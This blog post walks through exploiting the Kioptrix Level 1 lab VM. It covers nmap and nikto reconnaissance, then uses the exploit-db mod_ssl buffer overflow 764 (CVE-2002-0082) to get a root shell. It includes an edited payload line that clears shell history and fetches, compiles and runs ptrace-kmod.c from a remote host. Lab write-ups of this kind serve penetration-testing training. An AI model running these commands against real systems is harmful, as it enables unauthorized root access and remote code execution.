---
layout: post
title: Vulnerable VMs: Kioptrix Pt. 1
published: true
---

The Kioptrix series of vulnerable VMs closely resemble the material presented in the PWK course, and the OCSP exam. Kioptrix Level 1 starts out relatively easy, so let’s get started:

Once we have the VM loaded in bridged adapter mode (directly connected to physical network), let’s quickly scan our subnet for the machine:

```bash
nmap -sS -T5 192.168.1.0/24
```
 

Our output shows that our target is at `192.168.1.104`. Let’s perform a direct scan that fingerprints open ports/services:

```bash
nmap -sV -sT -A -T4 -sC 192.168.1.104
```
 

Which tells us that an Apache web server is running on the target:

```
443/tcp  open  ssl/https  Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2017-01-28T00:10:51+00:00; -37d09h58m43s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
...snip..
```

Notably, this server is running a very outdated version of Apache and OpenSSL. We think the version of OpenSSL has a working exploit, however, let’s confirm our suspicion with a quick `nikto` scan:

```bash
nikto -h 192.168.1.104:80
```
 

Which returns an interesting line:
```
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
```


`nikto` confirms our suspicion that `mod_ssl` has an RCE vulnerability in versions 2.8.7 and lower. Let’s find the exploit:

```bash
searchsploit mod_ssl 2.8.7
```
 

`searchsploit` is telling us that the exploit is at `/usr/share/exploitdb/platforms/unix/remote/21671.c`. However, this version was a bit outdated, so I downloaded my exploit straight from exploit-db:

```bash
wget https://www.exploit-db.com/download/764
```
 

Now, we have to make a few changes to the source code since this exploit is a bit outdated. First, there is a hard-coded line to `wget` some resources from packetstormsecurity, however, their download domain has changed since then. Find the following line:

```c
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```


and replace it with:

```c
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```
 

Now we need to import the RC4/MD5 OpenSSL libraries for compatibility with this legacy SSL version. Add the following include statements:

```c
#include openssl/rc4.h
```
```c
#include openssl/md5.h
```
 

And compile the exploit per the instructions in the code comments:

```bash
gcc -o pwn 764.c -lcrypto
```
 

Run the exploit with the following arguments (Note, the 0x6b argument specifies the version of apache/server platform, detailed in exploit help):

```bash
./pwn 0x6b 192.168.1.104
```
 

And you get a root shell! Easy peasy.
